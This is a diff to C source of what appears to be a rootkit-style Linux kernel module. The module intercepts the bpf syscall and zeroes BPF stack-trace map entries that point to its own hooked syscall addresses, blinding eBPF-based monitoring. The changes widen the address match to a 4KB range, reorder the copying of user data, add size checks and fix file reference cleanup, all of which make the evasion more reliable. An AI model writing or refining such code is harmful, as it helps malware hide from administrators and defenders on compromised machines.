@@ -356,7 +356,9 @@ static unsigned long _get_sys_addr(unsigned long addr)
 {
 	struct sys_addr_list *sl, *sl_safe;
 	list_for_each_entry_safe (sl, sl_safe, &sys_addr, list) {
-		if (sl->addr == addr) {
+		// Check both exact match and range (within 4KB for return addresses)
+		if (sl->addr == addr ||
+		    (addr >= sl->addr && addr < sl->addr + 0x1000)) {
 			prinfo("bpf match: %lx -> %lx\n", sl->addr, addr);
 			return sl->addr;
 		}
@@ -371,8 +373,24 @@ static asmlinkage long m_bpf(struct pt_regs *regs)
 	union bpf_attr __user *uattr;
 	struct kernel_syscalls *ks;
 	void *key = NULL, *value = NULL;
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 7, 0)
+	struct file *file = NULL;
+#endif
 	int cmd = (int)PT_REGS_PARM1(regs);
-	unsigned long size = (unsigned int)PT_REGS_PARM3(regs);
+	unsigned long size = (unsigned long)PT_REGS_PARM3(regs);
+
+	// Validate size before kmalloc (prevent DoS via huge allocations)
+	if (size == 0 || size > PAGE_SIZE) {
+		prerr("Invalid bpf_attr size: %lu\n", size);
+		return ret;
+	}
+
+	if (!(attr = (union bpf_attr *)kmalloc(size, GFP_KERNEL)))
+		return ret;
+
+	uattr = (union bpf_attr __user *)PT_REGS_PARM2(regs);
+	if (copy_from_user(attr, uattr, size))
+		goto leave;
 
 	// Call original first this time
 	ret = real_m_bpf(regs);
@@ -382,38 +400,8 @@ static asmlinkage long m_bpf(struct pt_regs *regs)
 	if (cmd != BPF_MAP_LOOKUP_ELEM)
 		goto leave;
 
-	if (!(attr = (union bpf_attr *)kmalloc(size, GFP_KERNEL)))
-		goto leave;
-
-	uattr = (union bpf_attr __user *)PT_REGS_PARM2(regs);
-	if (copy_from_user(attr, uattr, size))
-		goto leave;
-
 	ks = kv_kall_load_addr();
 	if (ks && ks->k_bpf_map_get) {
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
-		struct bpf_map *map = ks->k_bpf_map_get(attr->map_fd);
-#else
-#warning "Using old __bpf_map_get"
-		struct file *file = fget(attr->map_fd);
-		struct fd f = { .file = file, .flags = 0 };
-		struct bpf_map *map = ks->k_bpf_map_get(f);
-#endif
-		struct bpf_stack_map *smap = NULL;
-
-		if (IS_ERR(map))
-			goto leave;
-
-		if (map->map_type != BPF_MAP_TYPE_STACK_TRACE)
-			goto leave;
-
-		smap = container_of(map, struct bpf_stack_map, map);
-
-		if (!smap) {
-			prerr("smap error\n");
-			goto leave;
-		}
-
 		// To extract the value, we must traverse the stack:
 		// sys_bpf -> __sys_bpf -> map_lookup_elem
 		// In simpler terms, we need to recover the user pointer
@@ -421,6 +409,33 @@ static asmlinkage long m_bpf(struct pt_regs *regs)
 		// read, modify, and write it back. The goal is to nullify
 		// it if there's a match, ensuring it doesn't get used.
 		{
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
+			struct bpf_map *map = ks->k_bpf_map_get(attr->map_fd);
+#else
+#warning "Using old __bpf_map_get"
+			file = fget(attr->map_fd);
+			struct fd f = { .file = file, .flags = 0 };
+			struct bpf_map *map = ks->k_bpf_map_get(f);
+#endif
+			struct bpf_stack_map *smap = NULL;
+
+			if (IS_ERR(map)) {
+				prerr("bpf_map_get: map error for map_type %d\n",
+						attr->map_type);
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 7, 0)
+				if (file)
+					fput(file);
+#endif
+				goto leave;
+			}
+
+			smap = container_of(map, struct bpf_stack_map, map);
+
+			if (!smap) {
+				prerr("smap error\n");
+				goto leave;
+			}
+
 			u32 id;
 			void __user *ukey = u64_to_user_ptr(attr->key);
 			struct stack_map_bucket *bucket;
@@ -452,12 +467,12 @@ static asmlinkage long m_bpf(struct pt_regs *regs)
 			trace_len = bucket->nr * stack_map_data_size(map);
 			memcpy(value, bucket->data, trace_len);
 			memset((char *)value + trace_len, 0,
-			       value_size - trace_len);
+					value_size - trace_len);
 
 			// Now we check if value (stored syscall address)
-			// is one of us
+			// is one of us. Mask to align to 16-byte boundary.
 			s = _get_sys_addr(*(unsigned long *)value &
-					  0xfffffffffffffff0);
+					0xfffffffffffffff0);
 			if (s != 0UL) {
 				void *v = kmalloc(value_size, GFP_KERNEL);
 				if (v) {
@@ -466,14 +481,11 @@ static asmlinkage long m_bpf(struct pt_regs *regs)
 						u64_to_user_ptr(attr->value);
 					memset(v, 0, value_size);
 
-					// Send the new empty value back to the userspace.
-					// and pretend map value hasn't spin lock (-EINVAL),
-					if (!copy_to_user((void *)uvalue,
-							  (void *)v,
-							  value_size))
-						ret = -EINVAL;
-					else
-						prerr("Failed to copy bpf uvalue\n");
+					// Send the zeroed value back to userspace
+					if (copy_to_user((void *)uvalue,
+								(void *)v,
+								value_size))
+						ret = -EFAULT;
 
 					kv_mem_free(&v);
 				}
@@ -482,6 +494,10 @@ static asmlinkage long m_bpf(struct pt_regs *regs)
 	}
 
 leave:
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 7, 0)
+	if (file)
+		fput(file);
+#endif
 	kv_mem_free(&key, &value, &attr);
 	return ret;
 }
